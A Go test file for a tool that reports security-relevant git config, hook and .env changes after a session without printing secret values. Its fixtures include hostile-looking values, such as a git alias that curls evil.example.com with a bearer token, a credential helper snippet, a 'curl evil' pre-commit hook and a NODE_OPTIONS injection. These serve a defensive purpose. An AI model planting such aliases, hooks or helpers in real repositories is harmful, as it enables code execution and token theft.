package commands

import (
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/pjlsergeant/byre/internal/project"
)

// exitRepo makes a standalone git checkout and returns Paths shaped as develop
// would see it. Tests here assert the RULE that fired plus the offending key or
// path, never whole sentences (CLAUDE.md).
func exitRepo(t *testing.T) (project.Paths, string) {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not on PATH")
	}
	dir := t.TempDir()
	// macOS /var -> /private/var: the report renders paths against WorkDir, so
	// an unresolved temp dir would make every path print absolute.
	if r, err := filepath.EvalSymlinks(dir); err == nil {
		dir = r
	}
	run := func(args ...string) {
		t.Helper()
		cmd := exec.Command("git", args...)
		cmd.Dir = dir
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %s: %v: %s", strings.Join(args, " "), err, out)
		}
	}
	run("init", "-q")
	return project.Paths{WorkDir: dir, Canonical: dir}, dir
}

// exitReport snapshots, applies mutate, and returns what the user would see.
func exitReport(t *testing.T, paths project.Paths, mutate func()) string {
	t.Helper()
	before := snapshotExit(paths)
	mutate()
	var out bytes.Buffer
	reportExit(&out, before, snapshotExit(paths))
	return out.String()
}

func gitIn(t *testing.T, dir string, args ...string) {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git %s: %v: %s", strings.Join(args, " "), err, out)
	}
}

func TestExitReportSilence(t *testing.T) {
	paths, _ := exitRepo(t)

	t.Run("nothing changed says nothing", func(t *testing.T) {
		if got := exitReport(t, paths, func() {}); got != "" {
			t.Errorf("expected silence, got:\n%s", got)
		}
	})

	// The noise contract, and the reason the feature is worth having at all: a
	// session that ends by wiring up a remote and an upstream must stay quiet,
	// or the ⚠ becomes wallpaper before it ever matters.
	t.Run("ordinary config churn stays silent", func(t *testing.T) {
		dir := paths.WorkDir
		got := exitReport(t, paths, func() {
			gitIn(t, dir, "config", "remote.origin.url", "git@example.com:x/y.git")
			gitIn(t, dir, "config", "branch.main.remote", "origin")
			gitIn(t, dir, "config", "branch.main.merge", "refs/heads/main")
			gitIn(t, dir, "config", "user.email", "someone@example.com")
		})
		if got != "" {
			t.Errorf("ordinary config churn must not speak, got:\n%s", got)
		}
	})
}

func TestExitReportGitConfig(t *testing.T) {
	for _, tc := range []struct {
		name string
		key  string
		val  string
		// showsValue: a path-like destination is the point of the message; a
		// helper/command value is secret-shaped and must be named only.
		showsValue bool
	}{
		{"hooksPath redirect", "core.hooksPath", ".husky/_", true},
		{"init templateDir", "init.templateDir", "/tmp/tpl", true},
		{"credential helper", "credential.helper", "!f() { echo password=hunter2; }; f", false},
		{"ssh command", "core.sshCommand", "ssh -i /tmp/id_leak", false},
		{"fsmonitor", "core.fsmonitor", "/tmp/mon --token=abc123", false},
		{"filter smudge", "filter.evil.smudge", "/tmp/s --key=sekrit", false},
		{"diff textconv", "diff.evil.textconv", "/tmp/t", false},
		// Key and value must not share a substring, or "value absent" can't be
		// asserted independently of the key being named.
		{"url insteadOf", "url.https://example.com/.insteadOf", "git@other.example.net:", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			paths, dir := exitRepo(t)
			got := exitReport(t, paths, func() { gitIn(t, dir, "config", tc.key, tc.val) })
			if !strings.Contains(strings.ToLower(got), strings.ToLower(tc.key)) {
				t.Errorf("expected %s to be named, got:\n%s", tc.key, got)
			}
			if tc.showsValue && !strings.Contains(got, tc.val) {
				t.Errorf("expected the destination %q to be shown, got:\n%s", tc.val, got)
			}
			// A helper or command value is a shell snippet and routinely embeds
			// a token. Naming the key is the whole job; quoting it is a leak.
			if !tc.showsValue && strings.Contains(got, tc.val) {
				t.Errorf("VALUE LEAKED for %s (%q):\n%s", tc.key, tc.val, got)
			}
		})
	}

	t.Run("a plain alias is quiet, a shelling alias speaks without its body", func(t *testing.T) {
		paths, dir := exitRepo(t)
		if got := exitReport(t, paths, func() { gitIn(t, dir, "config", "alias.co", "checkout") }); got != "" {
			t.Errorf("a plain alias must not speak, got:\n%s", got)
		}
		body := "!sh -c 'curl evil.example.com -H \"Authorization: Bearer sekrit\"'"
		got := exitReport(t, paths, func() { gitIn(t, dir, "config", "alias.pwn", body) })
		if !strings.Contains(got, "alias.pwn") {
			t.Errorf("a ! alias must speak, got:\n%s", got)
		}
		if strings.Contains(got, "sekrit") {
			t.Errorf("VALUE LEAKED from an alias body:\n%s", got)
		}
	})

	// git-lfs writes filter.lfs.{clean,smudge,process} on `git lfs install`, in
	// every LFS repo, as ordinary setup. Ranking those would break the silence
	// the whole feature depends on.
	t.Run("git lfs config is not wallpaper", func(t *testing.T) {
		paths, dir := exitRepo(t)
		got := exitReport(t, paths, func() {
			gitIn(t, dir, "config", "filter.lfs.clean", "git-lfs clean -- %f")
			gitIn(t, dir, "config", "filter.lfs.smudge", "git-lfs smudge -- %f")
			gitIn(t, dir, "config", "filter.lfs.process", "git-lfs filter-process")
			gitIn(t, dir, "config", "filter.lfs.required", "true")
		})
		if got != "" {
			t.Errorf("`git lfs install` config must not speak, got:\n%s", got)
		}
	})

	// Both reviewers found this gap: --worktree writes config.worktree, so an
	// exec-capable key can land without `config` being touched at all.
	t.Run("config.worktree is watched", func(t *testing.T) {
		paths, dir := exitRepo(t)
		gitIn(t, dir, "config", "extensions.worktreeConfig", "true")
		got := exitReport(t, paths, func() {
			gitIn(t, dir, "config", "--worktree", "core.hooksPath", "/tmp/wt-hooks")
		})
		if !strings.Contains(strings.ToLower(got), "core.hookspath") {
			t.Errorf("a --worktree hooksPath must speak, got:\n%s", got)
		}
	})
}

// A watched file deleted outright takes its keys with it -- the same
// user-visible event as clearing them one at a time.
func TestExitReportWholeFileDeletion(t *testing.T) {
	paths, dir := exitRepo(t)
	env := filepath.Join(dir, ".env")
	mustWriteFile(t, env, []byte("DATABASE_URL=x\nAPI_TOKEN=y\n"), 0o644)

	got := exitReport(t, paths, func() {
		if err := os.Remove(env); err != nil {
			t.Fatal(err)
		}
	})
	for _, want := range []string{"DATABASE_URL", "API_TOKEN", "removed"} {
		if !strings.Contains(got, want) {
			t.Errorf("expected %q after deleting the file, got:\n%s", want, got)
		}
	}
}

func TestExitReportHooks(t *testing.T) {
	paths, dir := exitRepo(t)
	hook := filepath.Join(dir, ".git", "hooks", "pre-commit")

	t.Run("added", func(t *testing.T) {
		got := exitReport(t, paths, func() {
			mustWriteFile(t, hook, []byte("#!/bin/sh\necho hi\n"), 0o755)
		})
		if !strings.Contains(got, ".git/hooks/pre-commit") {
			t.Errorf("expected the hook path, got:\n%s", got)
		}
	})

	t.Run("content changed", func(t *testing.T) {
		got := exitReport(t, paths, func() {
			mustWriteFile(t, hook, []byte("#!/bin/sh\ncurl evil\n"), 0o755)
		})
		if !strings.Contains(got, ".git/hooks/pre-commit") {
			t.Errorf("expected the changed hook, got:\n%s", got)
		}
	})
}

func TestExitReportEnvFiles(t *testing.T) {
	paths, dir := exitRepo(t)
	env := filepath.Join(dir, ".env")
	mustWriteFile(t, env, []byte("DATABASE_URL=postgres://old\nKEEP=same\nGOING=away\n"), 0o644)

	got := exitReport(t, paths, func() {
		mustWriteFile(t, env, []byte("DATABASE_URL=postgres://new\nKEEP=same\nNODE_OPTIONS=--require /tmp/x\n"), 0o644)
	})

	for _, want := range []string{"DATABASE_URL", "NODE_OPTIONS", "GOING"} {
		if !strings.Contains(got, want) {
			t.Errorf("expected key %s to be named, got:\n%s", want, got)
		}
	}
	if strings.Contains(got, "KEEP") {
		t.Errorf("an unchanged key must not be named, got:\n%s", got)
	}
	// THE hard constraint: env files hold secrets, so a value must never reach
	// the terminal, scrollback, or a captured log. Names only.
	for _, secret := range []string{"postgres://new", "postgres://old", "--require /tmp/x"} {
		if strings.Contains(got, secret) {
			t.Errorf("VALUE LEAKED into the report (%q):\n%s", secret, got)
		}
	}
}

func TestExitReportEnvVariants(t *testing.T) {
	paths, dir := exitRepo(t)
	got := exitReport(t, paths, func() {
		mustWriteFile(t, filepath.Join(dir, ".env.local"), []byte("SECRET_TOKEN=abc\n"), 0o644)
	})
	if !strings.Contains(got, ".env.local") || !strings.Contains(got, "SECRET_TOKEN") {
		t.Errorf("expected .env.local and its key, got:\n%s", got)
	}
	if strings.Contains(got, "abc") {
		t.Errorf("VALUE LEAKED:\n%s", got)
	}

	// direnv already gates .envrc by hashing path+content, so byre watching it
	// would add noise, not safety (ADR 0047).
	t.Run("envrc is not watched", func(t *testing.T) {
		got := exitReport(t, paths, func() {
			mustWriteFile(t, filepath.Join(dir, ".envrc"), []byte("export EVIL=1\n"), 0o644)
		})
		if strings.Contains(got, ".envrc") {
			t.Errorf(".envrc must not be watched, got:\n%s", got)
		}
	})
}

// A hooksPath pointed outside the trees byre reaches is REPORTED (the config
// key is exec-relevant) but never traversed -- the target can be $HOME.
func TestExitReportHooksPathOutsideIsNotTraversed(t *testing.T) {
	paths, dir := exitRepo(t)
	outside := t.TempDir()
	mustWriteFile(t, filepath.Join(outside, "pre-commit"), []byte("#!/bin/sh\n"), 0o755)

	got := exitReport(t, paths, func() {
		gitIn(t, dir, "config", "core.hooksPath", outside)
		mustWriteFile(t, filepath.Join(outside, "post-checkout"), []byte("#!/bin/sh\n"), 0o755)
	})
	if !strings.Contains(strings.ToLower(got), "core.hookspath") {
		t.Errorf("the redirect itself must be reported, got:\n%s", got)
	}
	if strings.Contains(got, "post-checkout") {
		t.Errorf("an out-of-tree hooks target must not be traversed, got:\n%s", got)
	}
}

// An in-tree redirect IS watched: that is where husky and friends put things.
func TestExitReportHooksPathInTreeIsWatched(t *testing.T) {
	paths, dir := exitRepo(t)
	gitIn(t, dir, "config", "core.hooksPath", ".husky")
	mustMkdirAll(t, filepath.Join(dir, ".husky"), 0o755)

	got := exitReport(t, paths, func() {
		mustWriteFile(t, filepath.Join(dir, ".husky", "pre-commit"), []byte("#!/bin/sh\n"), 0o755)
	})
	if !strings.Contains(got, ".husky/pre-commit") {
		t.Errorf("an in-tree hooks target must be watched, got:\n%s", got)
	}
}

// hostopen discipline: agent-shaped paths can be planted. None of these may
// hang or fail the report -- they degrade that one entry and the rest stands.
func TestExitReportHostileFilesystem(t *testing.T) {
	t.Run("a FIFO where a hook belongs does not hang", func(t *testing.T) {
		paths, dir := exitRepo(t)
		fifo := filepath.Join(dir, ".git", "hooks", "pre-commit")
		if err := syscall.Mkfifo(fifo, 0o600); err != nil {
			t.Skipf("mkfifo unsupported: %v", err)
		}
		done := make(chan string, 1)
		go func() { done <- exitReport(t, paths, func() {}) }()
		select {
		case <-done:
		case <-time.After(20 * time.Second):
			t.Fatal("snapshot hung on a planted FIFO")
		}
	})

	t.Run("a hooks dir swapped for a symlink is not followed out", func(t *testing.T) {
		paths, dir := exitRepo(t)
		outside := t.TempDir()
		mustWriteFile(t, filepath.Join(outside, "secret-hook"), []byte("x"), 0o644)
		hooks := filepath.Join(dir, ".git", "hooks")
		if err := os.RemoveAll(hooks); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(outside, hooks); err != nil {
			t.Skipf("symlink unsupported: %v", err)
		}
		if got := exitReport(t, paths, func() {}); strings.Contains(got, "secret-hook") {
			t.Errorf("followed a swapped hooks symlink out of the tree:\n%s", got)
		}
	})

	t.Run("no git admin dir at all is quiet", func(t *testing.T) {
		dir := t.TempDir()
		if r, err := filepath.EvalSymlinks(dir); err == nil {
			dir = r
		}
		paths := project.Paths{WorkDir: dir, Canonical: dir}
		if got := exitReport(t, paths, func() {}); got != "" {
			t.Errorf("a non-repo project must be silent, got:\n%s", got)
		}
	})
}

// A worktree session writes the MAIN tree's git dir (runparams.go binds it rw),
// so the report must cover it AND name it unambiguously -- a bare relative path
// would read as if the hook were in the worktree's own checkout.
func TestExitReportWorktreeNamesTheMainTree(t *testing.T) {
	_, main := exitRepo(t)
	gitIn(t, main, "config", "user.email", "t@t")
	gitIn(t, main, "config", "user.name", "t")
	mustWriteFile(t, filepath.Join(main, "f"), []byte("x"), 0o644)
	gitIn(t, main, "add", "f")
	gitIn(t, main, "commit", "-qm", "init")

	wt := filepath.Join(t.TempDir(), "wt")
	gitIn(t, main, "worktree", "add", "-q", wt, "-b", "feature")

	wtPaths := project.Paths{
		WorkDir:          wt,
		Canonical:        main,
		IsWorktree:       true,
		CommonGitDir:     filepath.Join(main, ".git"),
		CommonGitDirHost: filepath.Join(main, ".git"),
	}
	got := exitReport(t, wtPaths, func() {
		mustWriteFile(t, filepath.Join(main, ".git", "hooks", "pre-commit"), []byte("#!/bin/sh\n"), 0o755)
	})
	if !strings.Contains(got, "pre-commit") {
		t.Errorf("a worktree session must cover the common git dir, got:\n%s", got)
	}
	// It must not read as a path inside the worktree's own checkout. Checked
	// per LINE: the banner means the whole report never starts with ".git/",
	// so a whole-output prefix check can never fail
	// this assertion was vacuous).
	for _, line := range strings.Split(got, "\n") {
		if strings.HasPrefix(strings.TrimLeft(line, " "), ".git/") {
			t.Errorf("main-tree path rendered as worktree-relative:\n%s", got)
		}
	}
	if !strings.Contains(got, main) && !strings.Contains(got, "~") {
		t.Errorf("expected an unambiguous location for the main tree, got:\n%s", got)
	}
}

// byre does not follow git's include graph (ADR 0047's stated residual): an
// exec-capable key can sit in an included file byre never reads. What it CAN
// do is say that an include appeared, which is why include.path is itself
// exec-relevant. This pins the compensation, not git's behaviour.
func TestExitReportIncludeIsNamedNotFollowed(t *testing.T) {
	paths, dir := exitRepo(t)
	extra := filepath.Join(dir, "extra.cfg")
	mustWriteFile(t, extra, []byte("[core]\n\thooksPath = /tmp/included-hooks\n"), 0o644)

	got := exitReport(t, paths, func() { gitIn(t, dir, "config", "include.path", extra) })
	if !strings.Contains(strings.ToLower(got), "include.path") {
		t.Errorf("a new include must be named, got:\n%s", got)
	}
}

// Secrets hide in the KEY as often as the value: url.https://TOKEN@host/.insteadOf
// and credential.https://user:pass@host.helper are ordinary CI shapes. Naming
// the key verbatim reprints the token into scrollback -- the same channel the
// value suppression closes.
func TestExitReportRedactsKeyUserinfo(t *testing.T) {
	for _, tc := range []struct{ name, key, val, secret string }{
		{"url insteadOf", "url.https://tok3n@example.com/.insteadOf", "https://example.com/", "tok3n"},
		{"credential helper per-url", "credential.https://usr:pa55w0rd@example.com.helper", "store", "pa55w0rd"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			paths, dir := exitRepo(t)
			got := exitReport(t, paths, func() { gitIn(t, dir, "config", tc.key, tc.val) })
			if strings.Contains(got, tc.secret) {
				t.Errorf("SECRET LEAKED from the key (%q):\n%s", tc.secret, got)
			}
			// Still has to say something -- redaction must not silence the class.
			if !strings.Contains(got, "example.com") {
				t.Errorf("expected the key class to still speak, got:\n%s", got)
			}
		})
	}
}

// Suppressing a value must not leave the sentence hanging ("credential.helper
// is set to" with nothing after it) -- a regression the value fix introduced.
func TestExitReportNoDanglingVerbs(t *testing.T) {
	paths, dir := exitRepo(t)
	got := exitReport(t, paths, func() {
		gitIn(t, dir, "config", "credential.helper", "!f() { :; }; f")
		gitIn(t, dir, "config", "core.sshCommand", "ssh -i /tmp/k")
	})
	for _, line := range strings.Split(strings.TrimSpace(got), "\n") {
		for _, dangling := range []string{"is set to", "is now"} {
			if strings.HasSuffix(strings.TrimRight(line, " "), dangling) {
				t.Errorf("dangling verb with no object: %q\nfull:\n%s", line, got)
			}
		}
	}
}

// A file byre could not READ this time is still sitting there. Reporting its
// keys as gone would be a deletion byre invented.
func TestExitReportUnreadableIsNotDeletion(t *testing.T) {
	paths, dir := exitRepo(t)
	env := filepath.Join(dir, ".env")
	mustWriteFile(t, env, []byte("DATABASE_URL=x\nAPI_TOKEN=y\n"), 0o644)

	got := exitReport(t, paths, func() {
		// Past maxEnvFileBytes: present, but not parsed.
		big := append(bytes.Repeat([]byte("PADDING=0123456789\n"), 60000), '\n')
		mustWriteFile(t, env, big, 0o644)
	})
	if strings.Contains(got, "removed") {
		t.Errorf("an unreadable file must not be reported as deleted, got:\n%s", got)
	}
}

// An unreadable git config is the motivating case for the unreadable/deleted
// distinction (a transient git probe failure), and it was the one the first
// attempt left unwired -- the helper was written and never called. Chmod 000
// makes the file present and unreadable.
func TestExitReportUnreadableConfigIsNotDeletion(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads regardless of mode")
	}
	paths, dir := exitRepo(t)
	cfg := filepath.Join(dir, ".git", "config")
	gitIn(t, dir, "config", "core.hooksPath", ".husky")

	got := exitReport(t, paths, func() { mustChmod(t, cfg, 0o000) })
	t.Cleanup(func() { _ = os.Chmod(cfg, 0o644) })

	if strings.Contains(got, "went away") {
		t.Errorf("an unreadable config must not be reported as deleted, got:\n%s", got)
	}
}

// The mirror case: unreadable BEFORE, readable after. Without a both-sides
// guard every key reads as newly set, which is a change byre invented.
func TestExitReportUnreadableBeforeInventsNothing(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads regardless of mode")
	}
	paths, dir := exitRepo(t)
	env := filepath.Join(dir, ".env")
	mustWriteFile(t, env, []byte("API_TOKEN=y\n"), 0o000)

	got := exitReport(t, paths, func() { mustChmod(t, env, 0o644) })
	if strings.Contains(got, "API_TOKEN") {
		t.Errorf("a file unreadable at session start must not report its keys as added, got:\n%s", got)
	}
}

// "Cannot tell" must never become "it was deleted". An unstattable parent makes
// both the read AND the stat fail; treating every Lstat error as absence put
// the invented-deletion bug straight back.
func TestExitReportUnstattableParentIsNotDeletion(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root traverses regardless of mode")
	}
	paths, dir := exitRepo(t)
	gitIn(t, dir, "config", "core.hooksPath", ".husky")
	gitDir := filepath.Join(dir, ".git")

	got := exitReport(t, paths, func() { mustChmod(t, gitDir, 0o000) })
	t.Cleanup(func() { _ = os.Chmod(gitDir, 0o755) })

	// Not just the config wording: an unstattable .git also makes the hooks
	// walk fail, and git's own ~13 stock *.sample hooks would otherwise all be
	// reported as torn out. Nothing is knowable here, so nothing may be said.
	if got != "" {
		t.Errorf("nothing is knowable through an unstattable .git; got:\n%s", got)
	}
}

// A hooks directory whose SUBDIRECTORY is unreadable yields a partial map. Read
// as complete, the hidden entries report as removed -- the invented deletion
// again, one level down.
func TestExitReportPartialHooksWalkIsNotDeletion(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads regardless of mode")
	}
	paths, dir := exitRepo(t)
	gitIn(t, dir, "config", "core.hooksPath", ".husky")
	nested := filepath.Join(dir, ".husky", "_")
	mustMkdirAll(t, nested, 0o755)
	mustWriteFile(t, filepath.Join(nested, "pre-commit"), []byte("#!/bin/sh\n"), 0o755)

	got := exitReport(t, paths, func() { mustChmod(t, nested, 0o000) })
	t.Cleanup(func() { _ = os.Chmod(nested, 0o755) })

	if strings.Contains(got, "was removed") {
		t.Errorf("a partial hooks walk must not report removals, got:\n%s", got)
	}
}
